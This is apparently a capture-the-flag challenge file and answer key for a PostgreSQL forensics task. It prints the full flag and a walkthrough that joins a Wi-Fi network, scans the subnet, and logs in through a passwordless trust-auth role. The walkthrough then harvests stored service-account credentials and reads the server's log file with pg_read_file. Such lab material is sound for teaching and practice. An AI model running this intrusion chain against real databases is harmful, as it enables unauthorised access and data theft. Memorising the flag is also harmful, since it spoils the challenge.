# DB Challenge 1 - The Logs Never Forget

**Category:** Forensics
**Difficulty:** Hard
**Author:** Lt. Rico Kopernicus

## Description

Cracking `Icarus_Bridge` was only the doorway. Now that you're on the
network, the Icarus's crew database is in reach - but the interesting
stuff isn't in the tables anymore. Someone must've tidied up. Get onto the
database and find what they thought they'd erased.

Note: `w3m` (a terminal-based browser) is installed if you need to access webpages.

## Flag

`flag{th3_l0gs_r3m3mb3r_ev3ryth1ng}`

The flag is split across two log-only findings and must be reassembled:

- Part 1 - `flag{th3_l0gs_` - the literal value of a deleted `INSERT` into
  `integration_keys`, captured because `log_statement = 'all'` is on.
- Part 2 - `r3m3mb3r_ev3ryth1ng}` - the value written to a `recovery_phrase`
  column that was added, populated, and dropped again; the column no longer
  exists in the live schema but the DDL and `UPDATE` remain in the log.

## Solution

1. Connect to `Icarus_Bridge` with the PSK from Challenge 2 and pull a DHCP
   lease (you'll land on `192.168.1.0/24`).
   ```bash
   # edit /home/rh/connection.conf with ssid=Icarus_Bridge / psk=suhninnwittyeesoe
   wpa_supplicant -B -i wlan0 -c /home/rh/connection.conf
   dhclient wlan0
   ```
2. Scan the subnet. The database host is at the static address `192.168.1.11`
   (MAC vendor resolves to Oracle Corporation). Two more hosts turn up
   somewhere in the dynamic `.100`-`.200` range (MAC vendor Pyramid Computers
   GmbH) - these are walk-up kiosk terminals, each serving `80/tcp` plus a
   decoy banner port.
   ```bash
   nmap -sV 192.168.1.0/24
   ```
3. Browse the kiosk terminals. One (self-service portal) has hints on what database user is available.
   ```bash
   curl http://192.168.1.X/    # or: lynx/w3m http://192.168.1.X/
   curl http://192.168.1.X/help.html
   curl http://192.168.1.X/kiosk-runbook.txt
   ```
   The runbook is an IT troubleshooting doc mixed in with mundane bullet
   points (touchscreen calibration, printer jams, idle timeouts). One entry
   gives away the login that matters:
   > "Kiosk sessions authenticate against `icarus_core` as the `guest`
   > role; no password prompt should appear (trust auth is scoped to the
   > kiosk subnet)."
4. The default `postgres` superuser is refused off-box (pg_hba `reject`).
   The reachable login is that walk-up kiosk account, `guest`, which needs
   no password (pg_hba `trust`).
   ```bash
   psql -h 192.168.1.11 -U guest -d icarus_core
   ```
5. `guest` can read a handful of operational tables. `ops_config` holds the
   credentials for the log-export service account:
   ```sql
   SELECT * FROM ops_config WHERE key LIKE 'log_audit%';
   -- log_audit.username = icarus_svc
   -- log_audit.password = Sv3c-L0gAud1t-9f21
   ```
6. Reconnect as `icarus_svc`. It is not a superuser, but it was provisioned as
   the log-export account: member of `pg_read_server_files` and granted `EXECUTE`
   on the file-read functions, which is enough to read the server's own logs via
   SQL.
   ```bash
   psql -h 192.168.1.11 -U icarus_svc -d icarus_core
   # password above
   ```
   ```sql
   SELECT pg_ls_dir('log');                 -- postgresql.log
   \pset pager off
   SELECT pg_read_file('log/postgresql.log');
   ```
7. Mine the log:
   - Vector A - search for `integration_keys` / `centcom-uplink`. The `INSERT`
     literal contains `flag{th3_l0gs_`; note the row was `DELETE`d, so it's gone
     from the live table (`SELECT * FROM integration_keys;` is empty).
   - Vector B - search for `recovery_phrase`. The `ALTER TABLE crew ADD COLUMN`
     / `UPDATE ... callsign = 'BEACON'` line contains `r3m3mb3r_ev3ryth1ng}`,
     and the column was dropped again (`\d crew` no longer shows it).
8. Concatenate the two parts:
   ```
   flag{th3_l0gs_r3m3mb3r_ev3ryth1ng}
   ```

Grep-style shortcut once you can read the file:
```sql
SELECT line FROM regexp_split_to_table(pg_read_file('log/postgresql.log'), '\n') line
WHERE line LIKE '%centcom-uplink%' OR line LIKE '%recovery_phrase%';
```

## Techniques / Tags

`postgres`, `database`, `logging`, `forensics`, `web`
